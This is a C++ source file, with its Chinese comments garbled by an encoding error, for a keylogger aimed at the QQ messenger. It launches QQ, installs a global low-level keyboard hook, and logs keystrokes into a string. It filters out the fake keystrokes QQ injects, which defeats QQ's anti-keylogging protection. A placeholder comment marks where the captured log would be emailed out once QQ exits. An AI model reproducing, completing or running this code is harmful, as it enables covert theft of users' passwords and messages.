#include "Monitor.h"

//����ȫ�ֱ���
std::string g_ResStr;
HHOOK g_KbHook;

Monitor::Monitor(TCHAR* QQPath)
{
	this->QQPath = QQPath;
}

void Monitor::Start()
{
	//����Ŀ�����(QQ)
	STARTUPINFO si = { 0 }; PROCESS_INFORMATION pi; si.cb = sizeof(STARTUPINFO);
	if (CreateProcess(Monitor::QQPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi) == 0x0)
	{
		printf("���̴���ʧ��,code= %d \n", GetLastError());
		MessageBox(0, TEXT("Can't found QQ Path"), 0, 0);
		exit(0);
	}

	//����ȫ�ֹ��ӣ��ͼ����̹��ӣ�
	g_KbHook = SetWindowsHookExA(WH_KEYBOARD_LL, KeyBoardEvent, GetModuleHandleA(NULL), NULL);

	//�����ӽ��̣��ȴ�Ŀ����̽�����ж�ع��ӡ������ʼ�
	CreateThread(NULL, 0, WaitProcEnd, (LPVOID)& pi, 0, NULL);

	//���������߳��н���Windows��Ϣ�����������
	MSG msg;
	while (GetMessage(&msg, nullptr, 0, 0))
	{
		Sleep(1);
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
}

DWORD WINAPI WaitProcEnd(LPVOID lpThreadParameter)
{
	//Ŀ�������Ϣ
	PROCESS_INFORMATION pi = *(PROCESS_INFORMATION*)lpThreadParameter;

	//�ȴ��ӽ��̽���(����)�����������½��,QQ��1�����̾ͽ�����
	WaitForSingleObject(pi.hProcess, INFINITE);

	//ж�ؼ��̹���
	UnhookWindowsHookEx(g_KbHook);

	//�����ʼ�
	//Send Email ...

	//�˳�����
	ExitProcess(0);
	return 0;
}

LRESULT CALLBACK KeyBoardEvent(int code, WPARAM wParam, LPARAM lParam)
{
	KBDLLHOOKSTRUCT* kbDllHookStuct = (KBDLLHOOKSTRUCT*)lParam;
	if (wParam == WM_KEYUP)
	{
		if (kbDllHookStuct->vkCode == VK_LSHIFT || kbDllHookStuct->vkCode == VK_RSHIFT)
		{
			printf("[SHIFT UP]");
			g_ResStr += "[SHIFT UP]";
			printf("---vkCode=%x scanCode=%x flags=%x time=%x dwExtraInfo=%x ϵͳ������ʱ��=%x \n", kbDllHookStuct->vkCode, kbDllHookStuct->scanCode, kbDllHookStuct->flags, kbDllHookStuct->time, kbDllHookStuct->dwExtraInfo, GetTickCount());
		}
	}

	//-----------����1------------
	//if (wParam == WM_KEYDOWN)
	//{
	//	printf("---vkCode=%x scanCode=%x flags=%x time=%x dwExtraInfo=%x ϵͳ������ʱ��=%x \n", kbDllHookStuct->vkCode, kbDllHookStuct->scanCode, kbDllHookStuct->flags, kbDllHookStuct->time, kbDllHookStuct->dwExtraInfo, GetTickCount());
	//	return CallNextHookEx(0, code, wParam, lParam);
	//}
	//-----------����2------------
	//if (wParam == WM_KEYDOWN && kbDllHookStuct->time == GetTickCount())
	//{
	//	printf("---vkCode=%x scanCode=%x flags=%x time=%x dwExtraInfo=%x ϵͳ������ʱ��=%x \n", kbDllHookStuct->vkCode, kbDllHookStuct->scanCode, kbDllHookStuct->flags, kbDllHookStuct->time, kbDllHookStuct->dwExtraInfo, GetTickCount());
	//	return CallNextHookEx(0, code, wParam, lParam);
	//}
	//---------------------------

	if (wParam == WM_KEYDOWN)
	{
		if (kbDllHookStuct->flags == 0x0)
		{//��flags=0ʱ���յ�������ʵ������Ϣ
			if (kbDllHookStuct->vkCode == VK_LSHIFT || kbDllHookStuct->vkCode == VK_RSHIFT)
			{
				cout << "[SHIFT DOWN]";
				g_ResStr += "[SHIFT DOWN]";
			}
			else if (kbDllHookStuct->vkCode == 0xA2 || kbDllHookStuct->vkCode == 0xA3)
			{
				printf("[CTRL]");
				g_ResStr += "[CTRL]";
			}
			else if (kbDllHookStuct->vkCode == 0x1B)
			{
				printf("[ESC]");
				g_ResStr += "[ESC]";
			}
			else if (kbDllHookStuct->vkCode == 0x20)
			{
				printf("[SPACE]");
				g_ResStr += "[SPACE]";
			}
			else if (kbDllHookStuct->vkCode == 0x9)
			{
				printf("[TAB]");
				g_ResStr += "[TAB]";
			}
			else if (kbDllHookStuct->vkCode == 0x14)
			{
				printf("[CapsLock]");
				g_ResStr += "[CapsLock]";
			}
			else if (kbDllHookStuct->vkCode == 0x8)
			{
				printf("[Backspace]");
				g_ResStr += "[Backspace]";
			}
			else if (kbDllHookStuct->vkCode == 0xD)
			{
				printf("[Enter]");
				g_ResStr += "[Enter]";
			}
			else if (kbDllHookStuct->vkCode >= 0x60 && kbDllHookStuct->vkCode <= 0x69)
			{//С��������
				printf("%c", kbDllHookStuct->vkCode - 0x30);
				g_ResStr += (char)(kbDllHookStuct->vkCode - 0x30);
			}
			else if (kbDllHookStuct->vkCode >= 0x30 && kbDllHookStuct->vkCode <= 0x39)
			{//���������

				printf("%c", kbDllHookStuct->vkCode);
				g_ResStr += (char)kbDllHookStuct->vkCode;
			}
			else if (kbDllHookStuct->vkCode >= 0x41 && kbDllHookStuct->vkCode <= 0x5A)
			{//�������ĸ
				printf("%c", kbDllHookStuct->vkCode);
				g_ResStr += (char)kbDllHookStuct->vkCode;
			}
			else
			{
				printf("[0x%x]", kbDllHookStuct->vkCode);
				char temp[20] = { 0 };
				sprintf(temp, "[0x%x]", kbDllHookStuct->vkCode);
				g_ResStr += temp;
			}
		}
		else if (kbDllHookStuct->flags == 0x10)
		{//��flags = 0x10ʱ����QQ2019���͵�ģ�������Ϣ

			DWORD sysStartedTimd = GetTickCount();//ϵͳ������ʱ�䣨���룩
			if (abs((long)(kbDllHookStuct->time - sysStartedTimd)) < 0x100 && kbDllHookStuct->dwExtraInfo == 0x21)
			{//ӳ���ͼ���Ϣ��������timeʱ���==ϵͳ������ʱ�� �� dwExtraInfo=0x21
				printf("fake(ӳ����)");
				g_ResStr += "fake(ӳ����)";
			}
			else
			{//��ʱ�������Ϣ��������timeʱ���!=ϵͳ������ʱ�� �� dwExtraInfo=0x0
				//printf("fake(��ʱ�����)");
				//g_ResStr += "fake(��ʱ�����)";
				return CallNextHookEx(0, code, wParam, lParam);
			}
		}
		else
		{
			printf("������Ϣ");
			g_ResStr += "������Ϣ";
		}
		printf("---vkCode=%x scanCode=%x flags=%x time=%x dwExtraInfo=%x ϵͳ������ʱ��=%x \n", kbDllHookStuct->vkCode, kbDllHookStuct->scanCode, kbDllHookStuct->flags, kbDllHookStuct->time, kbDllHookStuct->dwExtraInfo, GetTickCount());
		char temp[200] = { 0 };
		sprintf(temp, "---vkCode=%x \n", kbDllHookStuct->vkCode);
		g_ResStr += temp;
	}
	//���return 1����ʾ��Ϣ�Ѵ���ϵͳ�Ͳ������·�����Ϣ
	return CallNextHookEx(0, code, wParam, lParam);
}
